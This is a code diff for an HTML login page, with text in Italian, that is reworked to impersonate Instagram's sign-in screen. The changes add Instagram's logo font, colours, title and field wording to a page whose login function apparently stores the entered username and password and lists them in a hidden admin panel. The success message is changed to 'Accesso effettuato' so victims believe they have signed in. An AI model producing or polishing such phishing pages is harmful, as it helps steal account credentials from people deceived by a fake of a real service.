@@ -3,7 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Accedi</title>
+<title>Instagram</title>
+
+<!-- FONT INSTAGRAM STYLE -->
+<link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
 
 <style>
 body {
@@ -22,7 +25,7 @@ body {
 }
 
 .container {
-    width: 360px;
+    width: 350px;
 }
 
 .box {
@@ -33,9 +36,11 @@ body {
 }
 
 .logo {
-    font-size: 40px;
-    margin-bottom: 20px;
-    font-weight: bold;
+    font-family: 'Billabong', cursive;
+    font-size: 60px;
+    font-weight: normal;
+    margin-bottom: 25px;
+    color: #262626;
 }
 
 input {
@@ -45,13 +50,14 @@ input {
     border: 1px solid #dbdbdb;
     border-radius: 6px;
     background: #fafafa;
+    font-size: 14px;
 }
 
 button {
     width: 100%;
     padding: 12px;
     margin-top: 10px;
-    background: #4dabf7;
+    background: #0095f6;
     border: none;
     border-radius: 8px;
     color: white;
@@ -59,18 +65,18 @@ button {
     cursor: pointer;
 }
 
-/* ADMIN BOX */
+button:hover {
+    background: #1877f2;
+}
+
+/* ADMIN */
 .admin {
-    width: 360px;
+    width: 350px;
     margin-top: 20px;
     background: white;
     border: 1px solid #dbdbdb;
     padding: 15px;
     display: none;
-}
-
-.admin h3 {
-    margin: 0 0 10px 0;
 }
 
 li {
@@ -84,9 +90,8 @@ li {
     bottom: 10px;
     right: 10px;
     font-size: 14px;
-    color: #888;
+    color: #999;
     cursor: pointer;
-    user-select: none;
 }
 </style>
 </head>
@@ -96,14 +101,16 @@ li {
 <div class="wrapper">
 
     <div class="container">
+
         <div class="box">
             <div class="logo">Instagram</div>
 
-            <input id="user" type="text" placeholder="Username">
+            <input id="user" type="text" placeholder="Numero di telefono, username o email">
             <input id="pass" type="password" placeholder="Password">
 
             <button onclick="login()">Accedi</button>
         </div>
+
     </div>
 
     <div class="admin" id="adminPanel">
@@ -128,7 +135,7 @@ function login() {
 
     aggiorna();
 
-    alert("Login salvato!");
+    alert("Accesso effettuato");
 }
 
 function aggiorna() {
